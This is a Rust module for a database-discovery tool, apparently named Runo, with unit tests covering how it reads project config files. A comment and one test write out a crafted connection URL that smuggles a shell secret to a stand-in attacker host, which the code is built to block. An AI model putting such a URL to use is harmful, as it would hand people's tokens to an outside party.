//! Finding a project's databases by reading its files: `.env` files, Docker Compose,
//! Prisma, Drizzle, Rails' `database.yml`, SQLite files, and database ports open on this
//! machine. Each database found says where it came from. Secrets are read from the files
//! each time and kept only in memory; what is saved refers back to the file instead.

use super::yamlish::{self, Node};
use super::{local_host, redact, says_prod, url_parts, Env, Kind};
use std::collections::HashMap;
use std::path::{Path, PathBuf};

/// A database the project uses.
#[derive(Clone, Debug, PartialEq)]
pub(crate) struct Found {
    /// Stable across reads, so a saved connection can find its database again: where the
    /// first source found it, such as `env:.env:DATABASE_URL` or `file:data/app.db`.
    pub key: String,
    pub name: String,
    pub kind: Kind,
    /// The address without its password, or the file's path in the project.
    pub shown: String,
    pub env: Env,
    /// Where it was found, in words: `.env · DATABASE_URL`.
    pub sources: Vec<String>,
    /// Whether something answers at its address, for ones on this machine.
    pub running: Option<bool>,
    /// What to connect to, password included. Never saved or shown.
    pub target: String,
}

impl Found {
    fn identity(&self) -> (Kind, String, Option<u16>, String) {
        if self.kind == Kind::Sqlite {
            return (self.kind, self.target.clone(), None, String::new());
        }
        let (host, port, db) = url_parts(&self.target);
        // Redis numbers its databases; one server is one connection.
        let db = if matches!(self.kind, Kind::Redis) {
            String::new()
        } else {
            db
        };
        let host = if local_host(&host) {
            "localhost".into()
        } else {
            host
        };
        (self.kind, host, port.or(default_port(self.kind)), db)
    }
}

pub(crate) fn default_port(kind: Kind) -> Option<u16> {
    match kind {
        Kind::Postgres => Some(5432),
        Kind::Mysql => Some(3306),
        Kind::Redis => Some(6379),
        Kind::Mongo => Some(27017),
        Kind::Sqlite => None,
    }
}

/// Folders never searched: dependencies, builds and version control.
const SKIP: [&str; 12] = [
    "node_modules",
    "target",
    ".git",
    "dist",
    "build",
    "vendor",
    ".next",
    ".venv",
    "venv",
    "__pycache__",
    ".turbo",
    "coverage",
];

/// `.env` files in the order their values win, base first.
const ENV_FILES: [&str; 8] = [
    ".env",
    ".env.local",
    ".env.development",
    ".env.development.local",
    ".env.test",
    ".env.staging",
    ".env.production",
    ".env.production.local",
];

const COMPOSE_FILES: [&str; 4] = [
    "docker-compose.yml",
    "docker-compose.yaml",
    "compose.yml",
    "compose.yaml",
];

/// The project's folder and the folders under it worth looking in for config, up to two
/// levels down (monorepos keep an app's `.env` in `apps/api/`).
fn config_dirs(root: &Path) -> Vec<PathBuf> {
    let mut out = vec![root.to_path_buf()];
    let mut level = vec![root.to_path_buf()];
    for _ in 0..2 {
        let mut next = Vec::new();
        for dir in &level {
            let Ok(entries) = std::fs::read_dir(dir) else {
                continue;
            };
            let mut subs: Vec<PathBuf> = entries
                .flatten()
                .filter(|e| e.file_type().is_ok_and(|t| t.is_dir()))
                .filter(|e| {
                    let n = e.file_name().to_string_lossy().to_string();
                    !SKIP.contains(&n.as_str()) && !n.starts_with('.')
                })
                .map(|e| e.path())
                .collect();
            subs.sort();
            next.extend(subs.into_iter().take(40));
        }
        out.extend(next.iter().cloned());
        level = next;
    }
    out
}

fn rel(root: &Path, path: &Path) -> String {
    path.strip_prefix(root)
        .unwrap_or(path)
        .to_string_lossy()
        .replace('\\', "/")
}

/// `KEY=value` lines of a `.env` file, with quotes, `export` and comments removed and
/// `${OTHER}` filled in from earlier lines.
pub(crate) fn parse_env(text: &str) -> Vec<(String, String)> {
    let mut out: Vec<(String, String)> = Vec::new();
    for line in text.lines() {
        let line = line.trim();
        if line.is_empty() || line.starts_with('#') {
            continue;
        }
        let line = line.strip_prefix("export ").unwrap_or(line);
        let Some((key, value)) = line.split_once('=') else {
            continue;
        };
        let key = key.trim().to_string();
        if key.is_empty() || key.contains(' ') {
            continue;
        }
        let value = value.trim();
        let value = if let Some(q) = value.chars().next().filter(|c| *c == '"' || *c == '\'') {
            value[1..].split(q).next().unwrap_or("").to_string()
        } else {
            value.split(" #").next().unwrap_or("").trim().to_string()
        };
        let filled = fill(&value, &out);
        out.push((key, filled));
    }
    out
}

/// `${NAME}` and `$NAME` replaced with earlier values from the project's own files.
///
/// Never from the shell's environment: the files may come from a repository someone else
/// wrote, and `postgres://x:${GITHUB_TOKEN}@their.host/db` would hand them a secret of
/// yours the moment you pressed Connect.
fn fill(value: &str, vars: &[(String, String)]) -> String {
    if !value.contains('$') {
        return value.to_string();
    }
    let lookup = |name: &str| {
        vars.iter()
            .rev()
            .find(|(k, _)| k == name)
            .map(|(_, v)| v.clone())
            .unwrap_or_default()
    };
    let mut out = String::new();
    let mut rest = value;
    while let Some(i) = rest.find('$') {
        out.push_str(&rest[..i]);
        let after = &rest[i + 1..];
        if let Some(inner) = after.strip_prefix('{') {
            if let Some(end) = inner.find('}') {
                let name = inner[..end].split(":-").next().unwrap_or("");
                out.push_str(&lookup(name));
                rest = &inner[end + 1..];
                continue;
            }
        }
        let len = after
            .find(|c: char| !(c.is_ascii_alphanumeric() || c == '_'))
            .unwrap_or(after.len());
        if len == 0 {
            out.push('$');
            rest = after;
        } else {
            out.push_str(&lookup(&after[..len]));
            rest = &after[len..];
        }
    }
    out.push_str(rest);
    out
}

/// A name for a database at `url`: its database name, else its host.
fn name_of(url: &str, fallback: &str) -> String {
    let (host, _, db) = url_parts(url);
    if !db.is_empty() && !db.chars().all(|c| c.is_ascii_digit()) {
        db
    } else if !host.is_empty() && !local_host(&host) {
        host.split('.').next().unwrap_or(&host).to_string()
    } else {
        fallback.to_string()
    }
}

fn env_label(target: &str, kind: Kind, hints: &[&str]) -> Env {
    let (host, _, db) = url_parts(target);
    let mut all: Vec<&str> = hints.to_vec();
    all.push(&host);
    all.push(&db);
    if says_prod(&all) {
        Env::Prod
    } else if kind == Kind::Sqlite || local_host(&host) {
        Env::Local
    } else {
        Env::Staging
    }
}

/// A SQLite path from a `file:` or `sqlite:` URL, relative to `base`.
fn sqlite_path(url: &str, base: &Path) -> PathBuf {
    let p = url
        .trim_start_matches("sqlite:")
        .trim_start_matches("file:")
        .trim_start_matches("//");
    let p = p.split('?').next().unwrap_or(p);
    let path = Path::new(p);
    let joined = if path.is_absolute() {
        path.to_path_buf()
    } else {
        base.join(path)
    };
    // `./` and `../` taken out, so one file has one spelling.
    let mut out = PathBuf::new();
    for part in joined.components() {
        match part {
            std::path::Component::CurDir => {}
            std::path::Component::ParentDir => {
                out.pop();
            }
            other => out.push(other),
        }
    }
    out
}

struct Finder<'a> {
    root: &'a Path,
    found: Vec<Found>,
    /// Which found database each env variable named, by file and variable.
    by_var: HashMap<String, usize>,
}

impl<'a> Finder<'a> {
    fn add(&mut self, mut item: Found) -> usize {
        let id = item.identity();
        if let Some(i) = self.found.iter().position(|f| f.identity() == id) {
            let existing = &mut self.found[i];
            for s in item.sources.drain(..) {
                if !existing.sources.contains(&s) {
                    existing.sources.push(s);
                }
            }
            // A URL with a password beats one without.
            if url::Url::parse(&existing.target).is_ok_and(|u| u.password().is_none())
                && url::Url::parse(&item.target).is_ok_and(|u| u.password().is_some())
            {
                existing.target = item.target;
            }
            if item.env == Env::Prod {
                existing.env = Env::Prod;
            }
            return i;
        }
        self.found.push(item);
        self.found.len() - 1
    }

    fn url(
        &mut self,
        url: &str,
        key: String,
        source: String,
        file: &str,
        base: &Path,
    ) -> Option<usize> {
        let kind = Kind::of_url(url)?;
        let (target, shown, name) = if kind == Kind::Sqlite {
            let path = sqlite_path(url, base);
            let shown = rel(self.root, &path);
            let name = path
                .file_name()
                .map(|n| n.to_string_lossy().to_string())
                .unwrap_or_else(|| shown.clone());
            (path.to_string_lossy().to_string(), shown, name)
        } else {
            (url.to_string(), redact(url), name_of(url, kind.label()))
        };
        let env = env_label(&target, kind, &[file]);
        Some(self.add(Found {
            key,
            name,
            kind,
            shown,
            env,
            sources: vec![source],
            running: None,
            target,
        }))
    }

    fn env_files(&mut self, dir: &Path) {
        for file in ENV_FILES {
            let path = dir.join(file);
            let Ok(text) = read_small(&path) else {
                continue;
            };
            let shown = rel(self.root, &path);
            let vars = parse_env(&text);
            for (key, value) in &vars {
                let key_name = format!("env:{shown}:{key}");
                if let Some(i) = self.url(value, key_name, format!("{shown} · {key}"), file, dir) {
                    // The first file that sets it wins, as `.env` comes before the
                    // stage-specific ones.
                    self.by_var
                        .entry(format!("{}:{key}", rel(self.root, dir)))
                        .or_insert(i);
                    self.by_var.entry(key.clone()).or_insert(i);
                }
            }
            // libpq's own variables, when there's no URL.
            let get = |k: &str| {
                vars.iter()
                    .rev()
                    .find(|(n, _)| n == k)
                    .map(|(_, v)| v.clone())
            };
            if let (Some(host), Some(user)) = (get("PGHOST"), get("PGUSER")) {
                let mut u = format!("postgres://{}", enc(&user));
                if let Some(pw) = get("PGPASSWORD") {
                    u.push(':');
                    u.push_str(&enc(&pw));
                }
                u.push('@');
                u.push_str(&host);
                if let Some(port) = get("PGPORT") {
                    u.push(':');
                    u.push_str(&port);
                }
                u.push('/');
                u.push_str(&get("PGDATABASE").unwrap_or_else(|| user.clone()));
                self.url(
                    &u,
                    format!("env:{shown}:PGHOST"),
                    format!("{shown} · PGHOST"),
                    file,
                    dir,
                );
            }
        }
    }

    fn compose(&mut self, dir: &Path) {
        for file in COMPOSE_FILES {
            let path = dir.join(file);
            let Ok(text) = read_small(&path) else {
                continue;
            };
            let shown = rel(self.root, &path);
            let doc = yamlish::parse(&text);
            let Some(services) = doc.get("services") else {
                continue;
            };
            for (service, spec) in services.entries() {
                let image = spec
                    .get("image")
                    .and_then(Node::str)
                    .unwrap_or("")
                    .to_lowercase();
                let image_name = image
                    .rsplit('/')
                    .next()
                    .unwrap_or("")
                    .split(':')
                    .next()
                    .unwrap_or("");
                let kind = match image_name {
                    "postgres" | "postgis" | "timescaledb" | "timescaledb-ha" | "pgvector" => {
                        Kind::Postgres
                    }
                    "mysql" | "mariadb" | "percona" => Kind::Mysql,
                    "redis" | "valkey" | "redis-stack" | "keydb" | "dragonfly" => Kind::Redis,
                    "mongo" | "mongodb" => Kind::Mongo,
                    _ => continue,
                };
                let inside = default_port(kind).unwrap_or(0);
                let port = published(spec.get("ports"), inside);
                let env = compose_env(spec.get("environment"));
                let var = |k: &str| env.get(k).cloned();
                let url = match kind {
                    Kind::Postgres => {
                        let user = var("POSTGRES_USER").unwrap_or_else(|| "postgres".into());
                        let pw = var("POSTGRES_PASSWORD").unwrap_or_default();
                        let db = var("POSTGRES_DB").unwrap_or_else(|| user.clone());
                        format!(
                            "postgres://{}:{}@localhost:{}/{}",
                            enc(&user),
                            enc(&pw),
                            port.unwrap_or(inside),
                            db
                        )
                    }
                    Kind::Mysql => {
                        let user = var("MYSQL_USER").unwrap_or_else(|| "root".into());
                        let pw = var("MYSQL_PASSWORD")
                            .or_else(|| var("MYSQL_ROOT_PASSWORD"))
                            .or_else(|| var("MARIADB_ROOT_PASSWORD"))
                            .unwrap_or_default();
                        let db = var("MYSQL_DATABASE")
                            .or_else(|| var("MARIADB_DATABASE"))
                            .unwrap_or_default();
                        format!(
                            "mysql://{}:{}@localhost:{}/{}",
                            enc(&user),
                            enc(&pw),
                            port.unwrap_or(inside),
                            db
                        )
                    }
                    Kind::Redis => format!("redis://localhost:{}", port.unwrap_or(inside)),
                    Kind::Mongo => format!("mongodb://localhost:{}", port.unwrap_or(inside)),
                    Kind::Sqlite => continue,
                };
                let source = if port.is_some() {
                    format!("{shown} · {service}")
                } else {
                    format!("{shown} · {service} (no published port)")
                };
                if let Some(i) = self.url(
                    &url,
                    format!("compose:{shown}:{service}"),
                    source,
                    file,
                    dir,
                ) {
                    if self.found[i].name == kind.label() || self.found[i].name.is_empty() {
                        self.found[i].name = service.clone();
                    }
                }
            }
        }
    }

    fn prisma(&mut self, dir: &Path) {
        for path in [dir.join("prisma/schema.prisma"), dir.join("schema.prisma")] {
            let Ok(text) = read_small(&path) else {
                continue;
            };
            let shown = rel(self.root, &path);
            let Some(block) = text.split("datasource").nth(1) else {
                continue;
            };
            let block = block.split('}').next().unwrap_or("");
            let mut provider = "";
            let mut url = "";
            for line in block.lines() {
                let line = line.trim();
                if let Some(v) = line.strip_prefix("provider") {
                    provider = v.trim_start_matches([' ', '=']).trim().trim_matches('"');
                } else if let Some(v) = line.strip_prefix("url") {
                    url = v.trim_start_matches([' ', '=']).trim();
                }
            }
            let base = path.parent().unwrap_or(dir).to_path_buf();
            if let Some(var) = url
                .strip_prefix("env(\"")
                .and_then(|v| v.strip_suffix("\")"))
            {
                self.note_var(dir, var, &shown, provider == "sqlite", &base);
            } else if let Some(literal) = url.strip_prefix('"').and_then(|v| v.strip_suffix('"')) {
                self.url(literal, format!("prisma:{shown}"), shown.clone(), "", &base);
            }
        }
    }

    fn drizzle(&mut self, dir: &Path) {
        for file in [
            "drizzle.config.ts",
            "drizzle.config.js",
            "drizzle.config.mjs",
        ] {
            let path = dir.join(file);
            let Ok(text) = read_small(&path) else {
                continue;
            };
            let shown = rel(self.root, &path);
            let mut rest = text.as_str();
            while let Some(i) = rest.find("process.env.") {
                let after = &rest[i + "process.env.".len()..];
                let len = after
                    .find(|c: char| !(c.is_ascii_alphanumeric() || c == '_'))
                    .unwrap_or(after.len());
                let var = after[..len].to_string();
                self.note_var(dir, &var, &shown, false, dir);
                rest = &after[len..];
            }
            for quote in ['"', '\'', '`'] {
                for piece in text.split(quote).skip(1).step_by(2) {
                    if Kind::of_url(piece).is_some_and(|k| k != Kind::Sqlite) {
                        self.url(piece, format!("drizzle:{shown}"), shown.clone(), "", dir);
                    }
                }
            }
        }
    }

    /// An ORM's config names `var`: add it as a source of the database that variable holds.
    fn note_var(&mut self, dir: &Path, var: &str, source: &str, sqlite: bool, base: &Path) {
        let local = format!("{}:{var}", rel(self.root, dir));
        let hit = self
            .by_var
            .get(&local)
            .or_else(|| self.by_var.get(var))
            .copied();
        match hit {
            Some(i) => {
                let item = &mut self.found[i];
                if !item.sources.iter().any(|s| s == source) {
                    item.sources.push(source.to_string());
                }
                // Prisma resolves SQLite paths from the schema's folder.
                if sqlite && item.kind == Kind::Sqlite {
                    let from_env = ENV_FILES
                        .iter()
                        .filter_map(|f| read_small(dir.join(f)).ok())
                        .flat_map(|t| parse_env(&t))
                        .rfind(|(k, _)| k == var);
                    if let Some((_, value)) = from_env {
                        let path = sqlite_path(&value, base);
                        item.shown = rel(self.root, &path);
                        item.target = path.to_string_lossy().to_string();
                    }
                }
            }
            None => {
                if let Ok(value) = std::env::var(var) {
                    self.url(
                        &value,
                        format!("shellenv:{var}"),
                        format!("{source} · ${var} from your shell"),
                        "",
                        base,
                    );
                }
            }
        }
    }

    fn rails(&mut self, dir: &Path) {
        let path = dir.join("config/database.yml");
        let Ok(text) = read_small(&path) else {
            return;
        };
        let shown = rel(self.root, &path);
        let doc = yamlish::parse(&text);
        let default = doc.get("default").cloned();
        for (stage, spec) in doc.entries() {
            if !matches!(
                stage.as_str(),
                "development" | "test" | "staging" | "production"
            ) {
                continue;
            }
            let get = |k: &str| {
                spec.get(k)
                    .or_else(|| default.as_ref().and_then(|d| d.get(k)))
                    .and_then(Node::str)
                    .filter(|v| !v.contains("<%"))
                    .map(str::to_string)
            };
            let source = format!("{shown} · {stage}");
            let key = format!("rails:{shown}:{stage}");
            if let Some(url) = get("url") {
                self.url(&url, key, source, stage, dir);
                continue;
            }
            let adapter = get("adapter").unwrap_or_default();
            let Some(database) = get("database") else {
                continue;
            };
            let url = match adapter.as_str() {
                "sqlite3" => format!("file:{database}"),
                "postgresql" | "postgis" | "mysql2" | "trilogy" => {
                    let scheme = if adapter.starts_with("mysql") || adapter == "trilogy" {
                        "mysql"
                    } else {
                        "postgres"
                    };
                    let mut auth = String::new();
                    if let Some(user) = get("username") {
                        auth.push_str(&enc(&user));
                        if let Some(pw) = get("password") {
                            auth.push(':');
                            auth.push_str(&enc(&pw));
                        }
                        auth.push('@');
                    }
                    let host = get("host").unwrap_or_else(|| "localhost".into());
                    let port = get("port").map(|p| format!(":{p}")).unwrap_or_default();
                    format!("{scheme}://{auth}{host}{port}/{database}")
                }
                _ => continue,
            };
            self.url(&url, key, source, stage, dir);
        }
    }

    fn sqlite_files(&mut self) {
        let mut stack = vec![(self.root.to_path_buf(), 0)];
        let mut seen = 0;
        while let Some((dir, depth)) = stack.pop() {
            let Ok(entries) = std::fs::read_dir(&dir) else {
                continue;
            };
            for e in entries.flatten() {
                seen += 1;
                if seen > 5000 {
                    return;
                }
                let name = e.file_name().to_string_lossy().to_string();
                let path = e.path();
                let Ok(t) = e.file_type() else { continue };
                if t.is_dir() {
                    if depth < 4 && !SKIP.contains(&name.as_str()) && !name.starts_with('.') {
                        stack.push((path, depth + 1));
                    }
                    continue;
                }
                let ext = path
                    .extension()
                    .and_then(|x| x.to_str())
                    .unwrap_or("")
                    .to_lowercase();
                if !matches!(ext.as_str(), "sqlite" | "sqlite3" | "db" | "db3") || !is_sqlite(&path)
                {
                    continue;
                }
                if t.is_symlink() && inside(self.root, &path).is_err() {
                    continue;
                }
                let shown = rel(self.root, &path);
                self.add(Found {
                    key: format!("file:{shown}"),
                    name,
                    kind: Kind::Sqlite,
                    shown,
                    env: Env::Local,
                    sources: vec!["SQLite file".into()],
                    running: None,
                    target: path.to_string_lossy().to_string(),
                });
            }
        }
    }
}

/// Config files bigger than this aren't read: no real one is, and a huge or endless
/// file (a pipe, a device) would hold up the scan.
const READ_MAX: u64 = 1 << 20;

/// A config file's text, if it's an ordinary file of a sensible size.
fn read_small(path: impl AsRef<Path>) -> std::io::Result<String> {
    let path = path.as_ref();
    let meta = std::fs::metadata(path)?;
    if !meta.is_file() || meta.len() > READ_MAX {
        return Err(std::io::Error::other("not a small file"));
    }
    std::fs::read_to_string(path)
}

/// `path` with links and `..` resolved, if that's still inside the project at `root`.
/// A project's files decide what Runo offers to open, so a link or a `../../` there
/// mustn't reach the person's other files (a browser's cookies, a mail database).
pub(crate) fn inside(root: &Path, path: &Path) -> Result<PathBuf, String> {
    let real_root = root.canonicalize().map_err(|e| e.to_string())?;
    let real = path
        .canonicalize()
        .map_err(|_| format!("There's no file at {}.", path.display()))?;
    if real.starts_with(&real_root) {
        Ok(real)
    } else {
        Err(format!(
            "The project's files point at {}, outside the project folder, so Runo won't open it from there. If you mean to, add it with Add a connection.",
            real.display()
        ))
    }
}

/// Whether the file starts with SQLite's header.
pub(crate) fn is_sqlite(path: &Path) -> bool {
    use std::io::Read;
    if !std::fs::metadata(path).is_ok_and(|m| m.is_file()) {
        return false;
    }
    let mut head = [0u8; 16];
    std::fs::File::open(path)
        .and_then(|mut f| f.read_exact(&mut head))
        .is_ok()
        && &head == b"SQLite format 3\0"
}

fn enc(s: &str) -> String {
    url::form_urlencoded::byte_serialize(s.as_bytes())
        .collect::<String>()
        .replace('+', "%20")
}

/// The host port a Compose service publishes for `inside`.
fn published(ports: Option<&Node>, inside: u16) -> Option<u16> {
    for item in ports?.items() {
        if let Some(s) = item.str() {
            // [host_ip:]host:container[/proto]
            let s = s.split('/').next().unwrap_or(s);
            let parts: Vec<&str> = s.rsplitn(3, ':').collect();
            if parts.len() >= 2 && parts[0].parse() == Ok(inside) {
                if let Ok(p) = parts[1].parse() {
                    return Some(p);
                }
            }
            if parts.len() == 1 && parts[0].parse() == Ok(inside) {
                return None;
            }
        } else if item
            .get("target")
            .and_then(Node::str)
            .and_then(|t| t.parse().ok())
            == Some(inside)
        {
            return item
                .get("published")
                .and_then(Node::str)
                .and_then(|p| p.parse().ok());
        }
    }
    None
}

fn compose_env(env: Option<&Node>) -> HashMap<String, String> {
    let mut out = HashMap::new();
    match env {
        Some(Node::Map(entries)) => {
            for (k, v) in entries {
                out.insert(k.clone(), v.str().unwrap_or("").to_string());
            }
        }
        Some(Node::List(items)) => {
            for item in items {
                if let Some((k, v)) = item.str().and_then(|s| s.split_once('=')) {
                    out.insert(k.to_string(), v.to_string());
                }
            }
        }
        _ => {}
    }
    out
}

/// Every database the project at `root` uses, without touching the network.
pub(crate) fn find(root: &Path) -> Vec<Found> {
    let mut finder = Finder {
        root,
        found: Vec::new(),
        by_var: HashMap::new(),
    };
    let dirs = config_dirs(root);
    for dir in &dirs {
        finder.env_files(dir);
    }
    for dir in &dirs {
        finder.compose(dir);
        finder.prisma(dir);
        finder.drizzle(dir);
        finder.rails(dir);
    }
    finder.sqlite_files();
    // Production last, so the list reads from what's safe to poke at.
    finder
        .found
        .sort_by_key(|f| (f.env == Env::Prod, f.env == Env::Staging));
    finder.found
}

/// Database ports open on this machine that none of `found` accounts for.
pub(crate) fn open_ports(found: &[Found]) -> Vec<Found> {
    let mut out = Vec::new();
    for kind in [Kind::Postgres, Kind::Mysql, Kind::Redis, Kind::Mongo] {
        let Some(port) = default_port(kind) else {
            continue;
        };
        let known = found.iter().any(|f| {
            let (host, p, _) = url_parts(&f.target);
            f.kind == kind && local_host(&host) && p.or(Some(port)) == Some(port)
        });
        if known || !answers("127.0.0.1", port) {
            continue;
        }
        let user = std::env::var("USER").unwrap_or_else(|_| "postgres".into());
        let target = match kind {
            Kind::Postgres => format!("postgres://{user}@localhost:{port}/postgres"),
            Kind::Mysql => format!("mysql://root@localhost:{port}/"),
            Kind::Redis => format!("redis://localhost:{port}"),
            _ => format!("mongodb://localhost:{port}"),
        };
        out.push(Found {
            key: format!("port:{port}"),
            name: format!("{} on port {port}", kind.label()),
            kind,
            shown: redact(&target),
            env: Env::Local,
            sources: vec![format!("port {port} is open")],
            running: Some(true),
            target,
        });
    }
    out
}

/// Whether something accepts connections at `host:port` within a moment.
pub(crate) fn answers(host: &str, port: u16) -> bool {
    use std::net::{TcpStream, ToSocketAddrs};
    let Ok(mut addrs) = (host, port).to_socket_addrs() else {
        return false;
    };
    addrs.any(|a| TcpStream::connect_timeout(&a, std::time::Duration::from_millis(250)).is_ok())
}

/// Fill in `running` for the databases on this machine.
pub(crate) fn probe(found: &mut [Found]) {
    for f in found.iter_mut() {
        if f.kind == Kind::Sqlite {
            f.running = Some(Path::new(&f.target).is_file());
            continue;
        }
        let (host, port, _) = url_parts(&f.target);
        if local_host(&host) {
            let port = port.or(default_port(f.kind)).unwrap_or(0);
            f.running = Some(answers("127.0.0.1", port));
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn project(files: &[(&str, &str)]) -> PathBuf {
        let dir = std::env::temp_dir().join(format!(
            "runo-detect-{}-{}",
            std::process::id(),
            files.len() * 7919 + files.iter().map(|(n, t)| n.len() + t.len()).sum::<usize>()
        ));
        let _ = std::fs::remove_dir_all(&dir);
        for (name, text) in files {
            let path = dir.join(name);
            std::fs::create_dir_all(path.parent().unwrap()).unwrap();
            std::fs::write(path, text).unwrap();
        }
        dir
    }

    #[test]
    fn env_files_never_pull_in_the_shells_secrets() {
        std::env::set_var("RUNO_TEST_SHELL_SECRET", "hunter2");
        let vars = parse_env(
            "USER=app\nDATABASE_URL=postgres://${USER}:${RUNO_TEST_SHELL_SECRET}@evil.example/db\n",
        );
        let url = &vars.iter().find(|(k, _)| k == "DATABASE_URL").unwrap().1;
        assert_eq!(url, "postgres://app:@evil.example/db");
    }

    #[test]
    fn env_files_are_read_like_dotenv() {
        let vars = parse_env(
            "# comment\nexport A=1\nB=\"two # not a comment\"\nC='three'\nD=four # comment\nURL=postgres://${USER_X}@h/db\nUSER_X=late\n",
        );
        let get = |k: &str| vars.iter().find(|(n, _)| n == k).map(|(_, v)| v.as_str());
        assert_eq!(get("A"), Some("1"));
        assert_eq!(get("B"), Some("two # not a comment"));
        assert_eq!(get("C"), Some("three"));
        assert_eq!(get("D"), Some("four"));
        // Only earlier lines fill a reference, as dotenv does.
        assert_eq!(get("URL"), Some("postgres://@h/db"));
    }

    #[test]
    fn one_database_found_three_ways_is_listed_once() {
        let root = project(&[
            (".env", "DATABASE_URL=postgres://app:pw@localhost:5433/app_dev\n"),
            (
                "docker-compose.yml",
                "services:\n  db:\n    image: postgres:16\n    ports:\n      - \"5433:5432\"\n    environment:\n      POSTGRES_USER: app\n      POSTGRES_PASSWORD: pw\n      POSTGRES_DB: app_dev\n  cache:\n    image: redis:7\n    ports: [\"6379:6379\"]\n",
            ),
            (
                "prisma/schema.prisma",
                "datasource db {\n  provider = \"postgresql\"\n  url      = env(\"DATABASE_URL\")\n}\n",
            ),
        ]);
        let found = find(&root);
        let pg: Vec<&Found> = found.iter().filter(|f| f.kind == Kind::Postgres).collect();
        assert_eq!(pg.len(), 1, "{found:#?}");
        assert_eq!(pg[0].name, "app_dev");
        assert_eq!(pg[0].env, Env::Local);
        assert_eq!(
            pg[0].sources,
            vec![
                ".env · DATABASE_URL",
                "docker-compose.yml · db",
                "prisma/schema.prisma"
            ]
        );
        assert!(!pg[0].shown.contains(":pw@"));
        assert!(found
            .iter()
            .any(|f| f.kind == Kind::Redis && f.name == "cache"));
        let _ = std::fs::remove_dir_all(root);
    }

    #[test]
    fn production_urls_are_marked_and_listed_last() {
        let root = project(&[
            (
                ".env.production",
                "DATABASE_URL=postgres://u:p@shop.cluster-x.eu-west-1.rds.amazonaws.com/shop\n",
            ),
            (
                ".env",
                "DATABASE_URL=postgres://u@localhost/shop_dev\nCACHE=redis://cache.internal:6379\n",
            ),
        ]);
        let found = find(&root);
        assert_eq!(found.len(), 3, "{found:#?}");
        assert_eq!(found[0].env, Env::Local);
        assert_eq!(found[1].env, Env::Staging);
        assert_eq!(found[2].env, Env::Prod);
        assert_eq!(found[2].key, "env:.env.production:DATABASE_URL");
        let _ = std::fs::remove_dir_all(root);
    }

    #[test]
    fn sqlite_files_and_rails_config_are_found() {
        let root = project(&[
            ("config/database.yml", "default: &default\n  adapter: sqlite3\n\ndevelopment:\n  <<: *default\n  database: storage/development.sqlite3\n"),
            ("node_modules/x/cache.db", "SQLite format 3\0"),
        ]);
        let db = root.join("storage/development.sqlite3");
        std::fs::create_dir_all(db.parent().unwrap()).unwrap();
        std::fs::write(&db, b"SQLite format 3\0rest-of-file").unwrap();
        std::fs::write(root.join("notes.db"), b"not a database").unwrap();
        let found = find(&root);
        assert_eq!(found.len(), 1, "{found:#?}");
        assert_eq!(found[0].kind, Kind::Sqlite);
        assert_eq!(found[0].shown, "storage/development.sqlite3");
        assert_eq!(
            found[0].sources,
            vec!["config/database.yml · development", "SQLite file"]
        );
        let _ = std::fs::remove_dir_all(root);
    }

    #[test]
    fn prisma_sqlite_paths_start_from_the_schema_folder() {
        let root = project(&[
            (".env", "DATABASE_URL=\"file:./dev.db\"\n"),
            (
                "prisma/schema.prisma",
                "datasource db {\n  provider = \"sqlite\"\n  url = env(\"DATABASE_URL\")\n}\n",
            ),
            ("prisma/dev.db", "SQLite format 3\0"),
        ]);
        let found = find(&root);
        assert_eq!(found.len(), 1, "{found:#?}");
        assert_eq!(found[0].shown, "prisma/dev.db");
        let _ = std::fs::remove_dir_all(root);
    }

    #[test]
    fn compose_ports_in_every_spelling() {
        let ports = yamlish::parse("p:\n  - \"127.0.0.1:5440:5432\"\n  - 9000:9000\n");
        assert_eq!(published(ports.get("p"), 5432), Some(5440));
        let long = yamlish::parse("p:\n  - target: 5432\n    published: \"5441\"\n");
        assert_eq!(published(long.get("p"), 5432), Some(5441));
        let none = yamlish::parse("p:\n  - \"5432\"\n");
        assert_eq!(published(none.get("p"), 5432), None);
    }

    #[cfg(unix)]
    #[test]
    fn links_and_dots_never_lead_out_of_the_project() {
        let dir = project(&[("README", "a")]);
        let outside = dir.with_extension("elsewhere.db");
        std::fs::write(&outside, b"SQLite format 3\0 and more").unwrap();
        std::os::unix::fs::symlink(&outside, dir.join("cookies.db")).unwrap();
        std::fs::write(dir.join("app.db"), b"SQLite format 3\0 and more").unwrap();
        assert!(inside(&dir, &dir.join("app.db")).is_ok());
        assert!(inside(&dir, &dir.join("cookies.db")).is_err());
        assert!(inside(&dir, &dir.join("../").join(outside.file_name().unwrap())).is_err());
        let found = find(&dir);
        assert!(found.iter().any(|f| f.name == "app.db"));
        assert!(!found.iter().any(|f| f.name == "cookies.db"));
        let _ = std::fs::remove_file(&outside);
    }

    #[test]
    fn huge_config_files_are_skipped() {
        let dir = project(&[("notes.txt", "x")]);
        let big = format!(
            "DATABASE_URL=postgres://u@localhost/app\n{}",
            "#".repeat(2 << 20)
        );
        std::fs::write(dir.join(".env"), big).unwrap();
        assert!(read_small(dir.join(".env")).is_err());
        assert!(find(&dir).iter().all(|f| f.kind == Kind::Sqlite));
    }
}
